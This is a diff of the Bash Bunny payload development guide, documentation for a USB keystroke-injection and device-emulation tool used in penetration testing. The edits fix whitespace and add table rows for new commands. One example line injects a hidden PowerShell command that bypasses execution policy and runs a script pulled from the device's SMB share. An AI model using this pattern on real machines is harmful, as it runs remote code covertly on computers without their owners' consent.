@@ -1,9 +1,9 @@
 
 # Bash Bunny Payload Development
 
-Bash Bunny payloads can be written in any standard text editor, such as notepad, vi or nano. 
+Bash Bunny payloads can be written in any standard text editor, such as notepad, vi or nano.
 
-Payloads must be named payload.txt. When the Bash Bunny boots with its switch in position 1 or 2, the payload.txt file from the corresponding switch folder is executed. 
+Payloads must be named payload.txt. When the Bash Bunny boots with its switch in position 1 or 2, the payload.txt file from the corresponding switch folder is executed.
 
 Payloads can be swapped by copy/paste when the Bash Bunny is in its arming mode (switch position 3 - closest to the USB plug) via Mass Storage.
 
@@ -33,13 +33,18 @@ This table is provides a non-exhaustive list of basic usage for some extensions.
 | ---------------- | ------------------------------------------------------------ | ---------------------------------------------- |
 | RUN              | Keystroke injection shortcut for mutli-OS command execution. | RUN WIN notepad.exe                            |
 |                  |                                                              | RUN OSX terminal                               |
+|                  |                                                              | RUN LINUX xterm                                |
 |                  |                                                              | RUN UNITY xterm                                |
 | GET              | Exports system variables                                     | GET TARGET_IP # exports $TARGET_IP             |
 |                  |                                                              | GET TARGET_HOSTNAME # exports $TARGET_HOSTNAME |
+|                  |                                                              | GET TARGET_OS # exports $TARGET_OS             |
 |                  |                                                              | GET HOST_IP # exports $HOST_IP                 |
 |                  |                                                              | GET SWITCH_POSITION # exports $SWITCH_POSITION |
 | REQUIRETOOL      | Exits payload with LED FAIL state if the specified tool is not found in /tools | REQUIRETOOL impacket         |
 | DUCKY_LANG       | Accepts two letter country code to set the HID injection language for subsequent ducky script / QUACK commands | DUCKY_LANG us |
+| CUCUMBER         | Single CPU core mode with governor set to ondemand (Best thermal option for long-term deployments) | CUCUMBER ENABLE                                |
+|                  | Quad CPU core mode with governor set to ondemand (Default behavior. Best overall power/performance) | CUCUMBER DISABLE                               |
+|                  | Quad CPU core mode with governor set to performance (Ludicrous speed. Not intended for long-term deployments) | CUCUMBER PLAID                                 |
 
 **NOTE**: Extensions replaced bunny_helpers.sh from [Bash Bunny firmware version 1.1](https://www.bashbunny.com/downloads/) onwards.
 
@@ -48,7 +53,7 @@ This table is provides a non-exhaustive list of basic usage for some extensions.
 
 ## ATTACKMODE
 
-ATTACKMODE is a bunny script command which specifies which devices to emulate. The ATTACKMODE command may be issued multiple times within a given payload. For example, a payload may begin by emulating Ethernet, then switch to emulating a keyboard and serial later based on a number of conditions. 
+ATTACKMODE is a bunny script command which specifies which devices to emulate. The ATTACKMODE command may be issued multiple times within a given payload. For example, a payload may begin by emulating Ethernet, then switch to emulating a keyboard and serial later based on a number of conditions.
 
 | ATTACKMODE         | Type                                   | Description                                                |
 | ------------------ | -------------------------------------- | ---------------------------------------------------------- |
@@ -81,11 +86,11 @@ Many combinations of attack modes are possible, however some are not. For exmapl
 
 ## LED
 
-The multi-color RGB LED status indicator on the Bash Bunny may be set using the LED command. It accepts either a combination of color and pattern, or a common payload state. 
+The multi-color RGB LED status indicator on the Bash Bunny may be set using the LED command. It accepts either a combination of color and pattern, or a common payload state.
 
 ### LED Colors
 
-| COMMAND | Description                    | 
+| COMMAND | Description                    |
 | ------- | ------------------------------ |
 | R       | Red                            |
 | G       | Green                          |
@@ -221,7 +226,7 @@ ATTACKMODE HID
 RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
 ~~~
 
-* Common payload states include a **SETUP**, with may include a **FAIL** if certain conditions are not met. 
+* Common payload states include a **SETUP**, with may include a **FAIL** if certain conditions are not met.
 * This is typically followed by either a single **ATTACK** or multiple **STAGE**s.
 * More complex payloads may include a **SPECIAL** function to wait until certain conditions are met.
 * Payloads commonly end with a **CLEANUP** phase, such as moving and deleting files or stopping services.
@@ -240,4 +245,3 @@ Keep this in mind as a payload which writes files to the USB Mass Storage partit
 ## Submitting Payloads
 
 Payloads may be submitted to the [Bash Bunny Payload git repository](https://github.com/hak5/bashbunny-payloads "Bash Bunny Payload git repository"). For a video tutorial on submitting payloads, see [Hak5 episode 2126](https://www.hak5.org/episodes/season-21/hak5-2126-how-to-write-bash-bunny-payloads-contribute-on-github).
-
